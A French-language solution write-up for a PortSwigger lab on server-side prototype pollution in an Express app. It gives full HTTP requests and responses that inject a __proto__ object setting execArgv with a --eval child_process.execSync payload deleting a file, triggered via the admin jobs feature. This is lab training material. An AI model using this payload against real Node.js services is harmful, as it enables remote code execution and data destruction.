# Lab

https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution

## Solution

Sur ce lab, on a la possibilité de polluer le prototype objet grâce à la requête de modification de profil :

```http
POST /my-account/change-address HTTP/2
Host: 0aa200bf046344c68bb9e704002c0049.web-security-academy.net
Cookie: session=klHqoTfjVr63ZWCwQpO6A3FC7pRlBpiu
Content-Length: 295
Content-Type: application/json;charset=UTF-8

{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "klHqoTfjVr63ZWCwQpO6A3FC7pRlBpiu",
  "__proto__": {
    "foo": ["bar"]
  }
}
```

```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"128-bICQIu8D9vqKXRw3k4NauO+BmIg"
Date: Sat, 06 Jan 2024 00:08:18 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 296

{
  "username": "wiener",
  "firstname": "Peter",
  "lastname": "Wiener",
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "isAdmin": true,
  "foo": ["bar"]
}
```

On a aussi accès dans ce lab à une fonctionnalité admin de maintenance permettant d'éxécuter des tâches :

```http
POST /admin/jobs HTTP/2
Host: 0aa200bf046344c68bb9e704002c0049.web-security-academy.net
Cookie: session=klHqoTfjVr63ZWCwQpO6A3FC7pRlBpiu
Content-Length: 251
Content-Type: application/json;charset=UTF-8

{
  "csrf": "EHOFrMivwaEdL1EGUVk4SgO0aRAsp8O7",
  "sessionId": "klHqoTfjVr63ZWCwQpO6A3FC7pRlBpiu",
  "tasks": ["db-cleanup", "fs-cleanup"]
}
```

```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"9b-vSLPaDAopDKZgkvmHAZqtO9FzcY"
Date: Sat, 06 Jan 2024 00:06:15 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 155

{
  "results": [
    {
      "name": "db-cleanup",
      "description": "Database cleanup",
      "success": true
    },
    {
      "name": "fs-cleanup",
      "description": "Filesystem cleanup",
      "success": true
    }
  ]
}
```

Cette fonctionnalité peut indiquer qu'un child node est invoqué et qu'on peut donc exécuter du code arbitraire.

On va donc utiliser la fonctionnalité de modification de profil pour polluer le prototype objet et ajouter `execArgv` :

```http
POST /my-account/change-address HTTP/2
Host: 0aa200bf046344c68bb9e704002c0049.web-security-academy.net
Cookie: session=klHqoTfjVr63ZWCwQpO6A3FC7pRlBpiu
Content-Length: 295
Content-Type: application/json;charset=UTF-8

{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "klHqoTfjVr63ZWCwQpO6A3FC7pRlBpiu",
  "__proto__": {
    "execArgv": [
      "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
  }
}
```

On voit dans la réponse que le prototype a bien été pollué :

```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"128-bICQIu8D9vqKXRw3k4NauO+BmIg"
Date: Sat, 06 Jan 2024 00:08:18 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 296

{
  "username": "wiener",
  "firstname": "Peter",
  "lastname": "Wiener",
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "Wienerville",
  "postcode": "BU1 1RP",
  "country": "UK",
  "isAdmin": true,
  "execArgv": [
    "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
  ]
}
```

Maintenant si on relance la fonctionnalité de maintenance, on voit que le fichier a bien été supprimé et le lab validé.